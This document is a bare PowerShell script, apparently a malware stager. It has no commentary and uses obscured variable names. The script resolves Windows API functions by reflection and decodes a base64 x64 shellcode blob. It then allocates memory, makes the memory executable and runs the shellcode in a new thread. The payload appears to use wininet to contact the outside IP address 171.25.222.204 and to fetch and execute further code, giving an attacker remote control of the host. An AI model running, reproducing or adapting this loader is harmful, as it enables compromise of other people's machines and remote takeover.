function xx {
        Param ($c5, $bkEir)
        $n7dJT = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $n7dJT.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($n7dJT.GetMethod('GetModuleHandle')).Invoke($null, @($c5)))), $bkEir))
}

function ns {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $cX,
                [Parameter(Position = 1)] [Type] $xS = [Void]
        )

        $aiEF = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $aiEF.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $cX).SetImplementationFlags('Runtime, Managed')
        $aiEF.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $xS, $cX).SetImplementationFlags('Runtime, Managed')

        return $aiEF.CreateType()
}

[Byte[]]$ygb = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUUgx0mVIi1JgVkiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6A8AAAAxNzEuMjUuMjIyLjIwNABaSInBScfAuwEAAE0xyVNTagNTSbpXiZ/GAAAAAP/V6PsAAAAvT0JXeUsxeXA2YXJCM01EZW9LczlSUXFEaFZaeDFoRHdrQk55a1hBX0VLQlVFZ3gwQnNYd0hpR0pKa19uNkJreFY0Y1hnVHd6OWp5REJJSEJxV1lzQ1pTaUpuLTY3aUxaby1WVkk0M0VOSFF4b0M2eUxObnVWUDdfYlVjV3dUSnVoVDFsOUlEWDZyWnBqc2FOXzd6cFgzc2tXbk4xOGFXMGF1NHFRTnJldDdIZ3RZUzA2SkczaEg2SWdkdkNSWkh3dHZUeDhZSWwtRXNXY3plX0ozQTRDZTlDTVdPOWRDdTRtX1BJSHdZUTBBdGVFVzhrUmJTR19STU9UAEiJwVNaQVhNMclTSLgAMqiEAAAAAFBTU0nHwutVLjv/1UiJxmoKX0iJ8WofWlJogDMAAEmJ4GoEQVlJunVGnoYAAAAA/9VNMcBTWkiJ8U0xyU0xyVNTScfCLQYYe//VhcB1H0jHwYgTAABJukTwNeAAAAAA/9VI/890Auuq6FUAAABTWWpAWkmJ0cHiEEnHwAAQAABJulikU+UAAAAA/9VIk1NTSInnSInxSInaScfAACAAAEmJ+Um6EpaJ4gAAAAD/1UiDxCCFwHSyZosHSAHDhcB10ljDWGoAWUnHwvC1olb/1Q==")
[Uint32]$yu = 0
$ej = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xx kernel32.dll VirtualAlloc), (ns @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $ygb.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($ygb, 0, $ej, $ygb.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xx kernel32.dll VirtualProtect), (ns @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($ej, [Uint32]$ygb.Length, 0x10, [Ref]$yu)) -eq $true) {
        $edTk = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xx kernel32.dll CreateThread), (ns @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$ej,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xx kernel32.dll WaitForSingleObject), (ns @([IntPtr], [Int32]))).Invoke($edTk,0xffffffff) | Out-Null
}
